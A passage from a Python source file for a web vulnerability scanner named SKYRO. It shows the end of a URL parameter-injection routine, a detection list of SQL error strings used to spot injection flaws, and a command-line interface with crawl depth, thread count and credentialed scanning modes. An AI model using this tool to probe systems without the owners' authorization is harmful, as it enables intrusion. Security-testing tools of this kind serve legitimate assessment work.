                        injected_urls.append(parsed_url._replace(query=new_query).geturl())
                    except (UnicodeDecodeError, UnicodeEncodeError):
                        # Skip injections that cause encoding issues
                        continue
                except Exception:
                    # Skip problematic parameters
                    continue
            return injected_urls
        except Exception:
            return []

    def detect_sql_errors(self, text):
        if not text:
            return False
        errors = [
            "sql syntax", "mysql_fetch_array", "unclosed quotation mark",
            "syntax error", "ora-", "microsoft ole db provider",
            "postgresql", "sqlite3", "pdoexception", "fatal error",
            "warning:", "mysql error", "ODBC SQL", "DB2 SQL",
            "Invalid column name", "JDBC", "SQL command not properly ended",
            "connection failed"
        ]
        return any(error.lower() in text.lower() for error in errors)


def main():
    """Main entry point for the SKYRO scanner"""
    parser = argparse.ArgumentParser(
        description="SKYRO Web Application Security Scanner v1.0",
        epilog="""
EXAMPLES:
  Basic scan with defaults (Depth: 3, Threads: 5):
    python skyro.py http://example.com

  Custom depth and threads:
    python skyro.py http://example.com -d 2 -t 3
    python skyro.py https://target.com -d 5 -t 10

SCANNING OPTIONS:
  Depth (1-10):     How many page levels to crawl
    1 = Home page only
    3 = Default (balanced)
    5+ = Deep crawling (slower but comprehensive)

  Threads (1-20):   Number of concurrent scan threads
    1-2 = Safe (minimal server load)
    5 = Default (balanced)
    10+ = Aggressive (faster but higher load)

OUTPUT:
  Reports are saved as: skyro_report_[domain]_[timestamp].html
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("url", 
                        help="Target URL to scan (e.g., http://testphp.vulnweb.com)")
    parser.add_argument("-t", "--threads", type=int, default=5,
                        help="Maximum concurrent threads (1-20, default: 5)")
    parser.add_argument("-d", "--depth", type=int, default=3,
                        help="Maximum crawling depth (1-10, default: 3)")
    parser.add_argument("-m", "--mode", type=str, default='black-box', choices=['black-box', 'grey-box'],
                        help="Scanning mode: 'black-box' (unauthenticated) or 'grey-box' (with credentials), default: black-box")
    parser.add_argument("-u", "--username", type=str, default=None,
                        help="Username for grey-box scanning (required when --mode is grey-box)")
    parser.add_argument("-p", "--password", type=str, default=None,
                        help="Password for grey-box scanning (required when --mode is grey-box)")
    args = parser.parse_args()

    if not args.url.startswith(('http://', 'https://')):
        print("\033[1;31mError: URL must start with http:// or https://\033[0m")
        sys.exit(1)

    if args.mode == 'grey-box' and (not args.username or not args.password):
        print("\033[1;31mError: Both username and password are required for grey-box scanning mode\033[0m")
        sys.exit(1)

    scanner = SKYROScanner(args.url, max_threads=args.threads, max_depth=args.depth, 
                          username=args.username, password=args.password, scanning_mode=args.mode)
    scanner.scan()


if __name__ == "__main__":
    main()